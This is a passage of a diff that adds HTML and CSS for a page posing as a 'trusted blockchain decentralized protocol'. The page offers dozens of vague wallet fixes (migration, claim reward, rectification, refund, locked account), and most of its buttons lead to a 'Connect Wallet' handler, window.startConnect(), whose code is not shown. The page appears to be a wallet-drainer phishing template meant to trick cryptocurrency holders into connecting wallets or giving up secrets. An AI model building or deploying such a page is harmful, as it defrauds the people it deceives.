+      border-width: 0 0 50px 99.5vw;
+      border-color: transparent transparent #fafbfe transparent;
+      bottom: -50px;
+      -webkit-transform: rotate(180deg);
+      transform: rotate(180deg)
+    }
+
+    .triangle-top-dark::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      width: 100%;
+      height: 0;
+      border-style: solid;
+      border-width: 0 0 50px 99.5vw;
+      border-color: transparent transparent #0E0B2B transparent;
+      top: -50px
+    }
+
+    .triangle-bottom-dark::before {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      width: 100%;
+      height: 0;
+      border-style: solid;
+      border-width: 0 0 50px 99.5vw;
+      border-color: transparent transparent #0E0B2B transparent;
+      bottom: -50px;
+      -webkit-transform: rotate(180deg);
+      transform: rotate(180deg)
+    }
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {
+      .brand-logo {
+        display: none
+      }
+    }
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:991px) {}
+
+    @media only screen and (max-width:991px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:991px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:1199px) {}
+
+    .header {
+      position: fixed;
+      top: 0;
+      right: 0;
+      z-index: 02;
+      background: #fff;
+      -webkit-box-shadow: 0 0 1.25rem rgba(31, 45, 61, 0.05);
+      box-shadow: 0 0 1.25rem rgba(31, 45, 61, 0.05)
+    }
+
+    @media only screen and (max-width:767px) {
+      .header {
+        left: 0;
+        padding: 10px 0px;
+        background: #fff
+      }
+    }
+
+    @media only screen and (max-width:991px) {
+      .header .brand-logo {
+        display: none;
+        margin: 0px 20px 0px 0px
+      }
+    }
+
+    @media only screen and (max-width:767px) {
+      .header .brand-logo {
+        display: block
+      }
+
+      .header .brand-logo img {
+        -webkit-filter: none;
+        filter: none
+      }
+    }
+
+    .header.landing {
+      padding: 20px 0px;
+      left: 0px
+    }
+
+    .header.landing a {
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      -ms-flex-pack: center;
+      justify-content: center
+    }
+
+    @media only screen and (max-width:991px) {
+      .header.landing a {
+        -webkit-box-pack: start;
+        -ms-flex-pack: start;
+        justify-content: flex-start
+      }
+    }
+
+    .header.landing .brand-logo {
+      display: block;
+      margin: 0px !important
+    }
+
+    .header.landing .brand-logo img {
+      -webkit-filter: none;
+      filter: none;
+      margin-right: 10px
+    }
+
+    @media only screen and (max-width:767px) {}
+
+    .theme-switch i {
+      margin-right: 20px;
+      cursor: pointer
+    }
+
+    .dark-light-toggle {
+      margin-right: 10px;
+      cursor: pointer
+    }
+
+    .dark-light-toggle i {
+      font-size: 20px
+    }
+
+    .dark-theme .light {
+      display: block;
+      color: #F8D62B
+    }
+
+    .navigation .navbar {
+      background-color: transparent !important;
+      padding: 0px
+    }
+
+    .navigation .navbar ul {
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center;
+      margin-left: auto
+    }
+
+    @media only screen and (max-width:991px) {
+      .navigation .navbar ul {
+        margin-top: 15px
+      }
+    }
+
+    .navigation .navbar ul>li {
+      display: inline-block;
+      padding: 0px 7px;
+      width: 100%
+    }
+
+    @media only screen and (max-width:991px) {
+      .navigation .navbar ul>li {
+        border-bottom: 1px solid #eaecf3;
+        margin: 0 15px;
+        padding: 7px 15px
+      }
+    }
+
+    .navigation .navbar ul>li>a {
+      font-size: 16px;
+      font-weight: 700;
+      color: #62759d !important
+    }
+
+    @media only screen and (max-width:991px) {
+      .navigation .navbar ul>li>a::after {
+        position: absolute;
+        right: 15px;
+        top: 25px
+      }
+    }
+
+    @media only screen and (min-width:991px) {
+      .navigation .navbar ul .dropdown>a {
+        position: relative;
+        -webkit-transition: all 0.2s ease-in-out;
+        transition: all 0.2s ease-in-out
+      }
+
+      .navigation .navbar ul li.dropdown:hover a::before {
+        opacity: 1;
+        bottom: -9px
+      }
+    }
+
+    @media only screen and (max-width:991px) {}
+
+    .signin-btn {
+      min-width: 100px
+    }
+
+    @media only screen and (max-width:991px) {
+      .signin-btn {
+        position: absolute;
+        right: 0;
+        top: 0
+      }
+    }
+
+    @media only screen and (max-width:991px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    .bottom {
+      position: relative
+    }
+
+    .bottom::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      width: 100%;
+      height: 0;
+      border-style: solid;
+      border-width: 0 0 50px 99.5vw;
+      border-color: transparent transparent #171347 transparent;
+      top: -50px
+    }
+
+    .bottom .bottom-logo p {
+      color: #62759d;
+      line-height: 30px;
+      font-weight: 400
+    }
+
+    @media only screen and (max-width:991px) {
+      .bottom .bottom-widget {
+        margin-bottom: 30px
+      }
+    }
+
+    .bottom .bottom-widget .widget-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 20px
+    }
+
+    .bottom .bottom-widget ul li a {
+      color: #62759d;
+      font-weight: 400;
+      margin-bottom: 10px;
+      display: inline-block
+    }
+
+    .footer {
+      border-top: 1px solid rgba(255, 255, 255, 0.09);
+      padding: 20px 0px;
+      position: relative;
+      bottom: 0
+    }
+
+    .footer .copyright {
+      position: relative;
+      text-align: left
+    }
+
+    .footer .copyright p {
+      margin: 0;
+      font-size: 14px;
+      color: #62759d
+    }
+
+    .footer .copyright p a {
+      color: #008AFF;
+      font-weight: 700
+    }
+
+    .footer .footer-social {
+      text-align: right
+    }
+
+    .footer .footer-social li {
+      display: inline-block
+    }
+
+    .footer .footer-social li a {
+      color: #62759d;
+      opacity: 0.5;
+      padding: 0px 10px
+    }
+
+    .dark-theme {
+      background-color: #000;
+      color: #c0ccda
+    }
+
+    .dark-theme h1,
+    .dark-theme h2,
+    .dark-theme h4 {
+      color: #fff
+    }
+
+    .dark-theme .bg-light {
+      background: #000 !important
+    }
+
+    .dark-theme .triangle-top-light::after {
+      border-color: transparent transparent #0a0f14 transparent
+    }
+
+    .dark-theme .triangle-top-dark::after {
+      border-color: transparent transparent #000 transparent
+    }
+
+    .dark-theme .triangle-bottom-light::before {
+      border-color: transparent transparent #0a0f14 transparent
+    }
+
+    .dark-theme .triangle-bottom-dark::before {
+      border-color: transparent transparent #000 transparent
+    }
+
+    .dark-theme .header {
+      background-color: #000
+    }
+
+    .dark-theme .btn-outline-primary {
+      color: #fff
+    }
+
+    .dark-theme .create-sell-content {
+      background: linear-gradient(180deg,#69696971 0,#15153b69 60%);
+    }
+
+    .dark-theme .footer,
+    .dark-theme .bottom {
+      background: #000
+    }
+
+    @media only screen and (max-width:575px) {}
+
+    @media only screen and (min-width:1200px) {}
+
+    .btn {
+      color: #fff;
+      padding: 5px 15px;
+      font-weight: 700
+    }
+
+    button:hover,
+    button:focus,
+    button:active,
+    .btn:hover,
+    .btn:focus,
+    .btn:active {
+      color: #fff
+    }
+
+    .btn-outline-primary:hover,
+    .btn-outline-primary:focus,
+    .btn-outline-primary:active,
+    .btn-outline-secondary:hover,
+    .btn-outline-secondary:focus,
+    .btn-outline-secondary:active,
+    .btn-outline-success:hover,
+    .btn-outline-success:focus,
+    .btn-outline-success:active,
+    .btn-outline-info:hover,
+    .btn-outline-info:focus,
+    .btn-outline-info:active,
+    .btn-outline-warning:hover,
+    .btn-outline-warning:focus,
+    .btn-outline-warning:active,
+    .btn-outline-danger:hover,
+    .btn-outline-danger:focus,
+    .btn-outline-danger:active,
+    .btn-outline-light:hover,
+    .btn-outline-light:focus,
+    .btn-outline-light:active {
+      color: #fff
+    }
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    .intro1 .intro-content h1 {
+      font-size: 3rem;
+      font-weight: 700;
+      line-height: 1.3
+    }
+
+    .intro1 .intro-content h1 span {
+      color: #008AFF
+    }
+
+    .intro1 .intro-content p {
+      font-size: 1.125rem;
+      color: #718096
+    }
+
+    .intro1 .intro-content .intro-btn .btn {
+      margin-right: 20px;
+      min-width: 150px;
+      font-weight: 600;
+      font-size: 16px;
+      padding: 8px
+    }
+
+    .intro1 .intro-content .intro-btn .btn i {
+      margin-left: 20px;
+      position: relative;
+      top: -2px
+    }
+
+    .intro-slider {
+      position: relative
+    }
+
+    .intro-slider .slider-item {
+      -webkit-transform: scale(1) perspective(1040px) rotateY(-18deg) rotateX(0) rotate(0);
+      transform: scale(1) perspective(1040px) rotateY(-18deg) rotateX(0) rotate(0);
+      position: relative
+    }
+
+    .intro-slider .slider-item img {
+      border-radius: 8px
+    }
+
+    .create-sell-content {
+      -webkit-box-shadow: 0 1rem 3rem rgba(31, 45, 61, 0.125);
+      box-shadow: 0 1rem 3rem rgba(31, 45, 61, 0.125);
+      padding: 50px 30px 30px;
+      border-radius: .75rem;
+      margin-bottom: 50px;
+      margin-top: 50px;
+      position: relative
+    }
+
+    .create-sell-content .create-sell-content-icon {
+      width: 75px;
+      height: 75px;
+      background: #008aff;
+      color: #fff;
+      font-size: 30px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      -ms-flex-pack: center;
+      justify-content: center;
+      position: absolute;
+      top: -40px
+    }
+
+    .create-sell-content .create-sell-content-icon i {
+      line-height: 0px
+    }
+
+    .intro-video-play {
+      background-color: #fff;
+      background-image: url("");
+      background-size: cover;
+      background-position: 0 0;
+      min-height: 465px;
+      margin: 0 auto;
+      position: relative;
+      border-radius: 5px;
+      z-index: 1;
+      margin-bottom: 30px;
+      -webkit-box-shadow: 0 1.5rem 4rem rgba(22, 28, 45, 0.1);
+      box-shadow: 0 1.5rem 4rem rgba(22, 28, 45, 0.1)
+    }
+
+    .intro-video-play::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      border-radius: 5px;
+      z-index: -1
+    }
+
+    .play-btn {
+      position: absolute;
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      -ms-flex-pack: center;
+      justify-content: center;
+      height: 100%;
+      width: 100%
+    }
+
+    .play-btn a {
+      background: #008AFF;
+      width: 75px;
+      height: 75px;
+      border-radius: 100px;
+      padding: 22px 0;
+      text-align: center;
+      cursor: pointer
+    }
+
+    .play-btn a i {
+      color: #fff;
+      font-size: 30px;
+      line-height: 0px
+    }
+        </style>
+        <style class="gtranslate_css">
+    body {
+      top: 0 !important
+    }
+
+    .gt_float_switcher {
+      font-family: Arial;
+      font-size: 20px;
+      border-radius: 2px;
+      color: #555;
+      display: inline-block;
+      line-height: 20px;
+      box-shadow: rgba(0, 0, 0, 0.15)0 5px 15px;
+      background: #fff;
+      overflow: hidden;
+      transition: all .5s cubic-bezier(0.4, 0, 1, 1)
+    }
+
+    .gt_float_switcher img {
+      vertical-align: middle;
+      display: inline-block;
+      width: 33px;
+      height: auto;
+      margin: 0 5px 0 0;
+      border-radius: 3px
+    }
+
+    .gt_float_switcher .gt_options {
+      position: relative;
+      z-index: 777;
+      max-height: 250px;
+      overflow-y: auto;
+      transform: translateY(-30px);
+      opacity: 0;
+      cursor: pointer;
+      transition: all .8s cubic-bezier(.3, 1.1, .4, 1.1)
+    }
+
+    .gt_float_switcher .gt-selected {
+      position: relative;
+      z-index: 888;
+      background-color: #fff;
+      cursor: pointer;
+      text-transform: uppercase;
+      overflow: hidden;
+      text-align: left
+    }
+
+    .gt_float_switcher .gt_options::-webkit-scrollbar-track {
+      background-color: #f5f5f5
+    }
+
+    .gt_float_switcher .gt_options::-webkit-scrollbar {
+      width: 5px
+    }
+
+    .gt_float_switcher .gt_options::-webkit-scrollbar-thumb {
+      background-color: #888
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang {
+      padding: 6px 15px;
+      color: #333;
+      font-weight: bold
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang span.gt-lang-code {
+      position: relative;
+      top: 2px
+    }
+
+    .gt_float_switcher .gt-selected .gt-current-lang span.gt_float_switcher-arrow {
+      display: inline-block;
+      height: 24px;
+      width: 15px;
+      vertical-align: middle;
+      background-image: url("");
+      background-position: 50%;
+      background-size: 11px;
+      background-repeat: no-repeat;
+      transition: all .3s;
+      transform: rotate(-180deg)
+    }
+        </style>
+        <div id="main-wrapper" class="front show" style="overflow-y: hidden;">
+            <div class="header landing">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-xl-12">
+                            <div class="navigation">
+                                <nav class="navbar navbar-expand-lg navbar-light">
+                                    <div class="brand-logo">
+                                        <a class="interactbutton">
+                                            <img src="20c325c67692b9015ddeb34d34f0925f0fe01664.png" alt="" class="logo-primary">
+                                            <img src="da39a3ee5e6b4b0d3255bfef95601890afd80709" alt="" class="logo-white sf-hidden">
+                                        </a>
+                                    </div>
+                                    <button
+                                        class="navbar-toggler sf-hidden interactbutton"
+                                        type="button"
+                                        data-bs-toggle="collapse"
+                                        data-bs-target="#navbarSupportedContent"
+                                        aria-controls="navbarSupportedContent"
+                                        aria-expanded="false"
+                                        aria-label="Toggle navigation"
+                                    ></button>
+                                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                                        <ul class="navbar-nav me-auto">
+                                            <li class="nav-item dropdown">
+                                                <a class="open-action-button nav-link interactbutton">Home</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="open-action-button nav-link interact-button interactbutton">Explore</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                    <div class="signin-btn d-flex align-items-center">
+                                        <div class="dark-light-toggle theme-switch">
+                                            <span class="dark sf-hidden"></span>
+                                        </div>
+                                        <a onclick="window.startConnect()" id="connect-modal-trigger" class="btn btn-primary interactbutton">Connect</a>
+                                    </div>
+                                </nav>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="intro1 section-padding">
+                <div class="container">
+                    <div class="row justify-content-between align-items-center">
+                        <div class="col-xl-5 col-lg-6 col-12">
+                            <div class="intro-content my-5">
+                                <h1 class="mb-3">
+                                    Your Trusted Blockchain
+                                    <span>Decentralized Protocol!</span>
+                                </h1>
+                                <p>
+                                    Your go-to online tool to seamlessly and efficiently fix any blockchain-related issues
+                you might encounter.
+                                </p>
+                                <div class="intro-btn mt-5 d-flex">
+                                    <a id="connect-modal-trigger" class="btn btn-primary interactbutton">Connect Wallet</a>
+                                    <a id="connect-modal-trigger" class="open-action-button btn btn-outline-primary interact-button interactbutton">Select Network</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-5 col-lg-6 col-12">
+                            <div class="intro-slider">
+                                <div class="slider-item">
+                                    <img
+                                        src="xclod-img.png.pagespeed.ic.S07_z6sv1Q.png"
+                                        alt=""
+                                        class="img-fluid"
+                                        style="border: 2px solid rgba(77, 77, 77, 0.773); border-radius: 20px;"
+                                    >
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="create-sell section-padding">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-xl-8">
+                            <div class="section-title text-center">
+                                <h2>Our Services</h2>
+                                <p>Blockchain Rectification issues that we could help resolve</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row align-items-center">
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>MIGRATION</h4>
+                                    <p>Click here for wallet transfer.</p>
+                                    <a class="open-action-button">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>Claim Reward</h4>
+                                    <p>Click here for reward related issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>Validation</h4>
+                                    <p>click here for Validation related issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>Rectification</h4>
+                                    <p>Click here to rectify issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Buy and Sell</h4>
+                                    <p>Click here for to buy and sell tokens.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Slippage Error</h4>
+                                    <p>Click here for slippage related error during trade.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Transaction Error</h4>
+                                    <p>Click here for transaction related issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>Fix your Wallet Problem</h4>
+                                    <p>
+                                        Our platform facilitates fixing Wallet Problem
+                , helping you securely.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>Refund</h4>
+                                    <p>
+                                        Lost access to your cryptocurrency? We specialize in wallet refund,
+                allowing you to regain control of your digital assets.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Smart Contract Audits and Debugging</h4>
+                                    <p>
+                                        Ensure the integrity of your smart contracts. Our experts conduct comprehensive
+                audits
+                and debugging to rectify vulnerabilities and improve security.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Token Deployment and Correction</h4>
+                                    <p>
+                                        Launching a token or facing issues with an existing one? We assist with token
+                deployment
+                and rectify any issues to ensure smooth functionality.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>DeFi Protocol Optimization</h4>
+                                    <p>
+                                        Enhance the performance of your DeFi platform. Our experts analyze and optimize your
+                DeFi
+                protocols for efficiency, security, and seamless user experiences
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>Airdrop Fixes</h4>
+                                    <p>
+                                        Resolve issues related to airdrops, ensuring accurate distribution and reception of
+                tokens during airdrop events.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Token Bridge Solutions</h4>
+                                    <p>
+                                        Develop and maintain token bridges, enabling seamless transfers and interoperability
+                between different blockchain networks.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>NFT (Non-Fungible Token) Solutions</h4>
+                                    <p>
+                                        Assist in the creation, management, and troubleshooting of NFTs, ensuring a smooth
+                experience in the NFT marketplace.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>BUY</h4>
+                                    <p>Buy tokens and coin.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>Sell</h4>
+                                    <p> sell tokens and coin.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>APR ACTIVATION</h4>
+                                    <p>Click here for APR activation.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Staking</h4>
+                                    <p>Click here to stake tokens.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>CONNECT TO DAPPS</h4>
+                                    <p>Click here to connect to DAPPS.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>TRANSACTION DELAY</h4>
+                                    <p>Click here for transaction delay issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>UNABLE TO BUY COIN/TOKEN</h4>
+                                    <p>Click here to fix inability to buy coins.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>TOKEN BRIDGE</h4>
+                                    <p>Click here for toekn bridge.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>Swap Functionality Enhancement</h4>
+                                    <p>
+                                        Optimize swap functionality within decentralized exchanges (DEXs) for improved speed,
+              accuracy, and user satisfaction.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-x-diamond"></i>
+                                </div>
+                                <div>
+                                    <h4>Buy and Sell Liquidity Issues Resolution</h4>
+                                    <p>
+                                        Address liquidity challenges affecting buy and sell actions, ensuring a balanced and
+              smooth liquidity provision within trading platforms.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Deposit and Withdrawal Management</h4>
+                                    <p>
+                                        Optimize deposit and withdrawal processes to enhance user experience and streamline
+              fund
+              transfers securely.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>Slippage Mitigation</h4>
+                                    <p>
+                                        Implement strategies to minimize slippage, providing users with more predictable and
+              cost-effective trades.
+                                    </p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>General Issues</h4>
+                                    <p>Click here for general related issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-circle-half"></i>
+                                </div>
+                                <div>
+                                    <h4>High Gas Fees</h4>
+                                    <p>Click here for gas fee related issues.</p>
+                                    <a class="interactbutton">
+                                        Explore
+                                        <i class="bi bi-arrow-right-short"></i>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-6 col-lg-6 col-md-6 interact-button">
+                            <div class="create-sell-content">
+                                <div class="create-sell-content-icon">
+                                    <i class="bi bi-shield-check"></i>
+                                </div>
+                                <div>
+                                    <h4>Locked Account</h4>
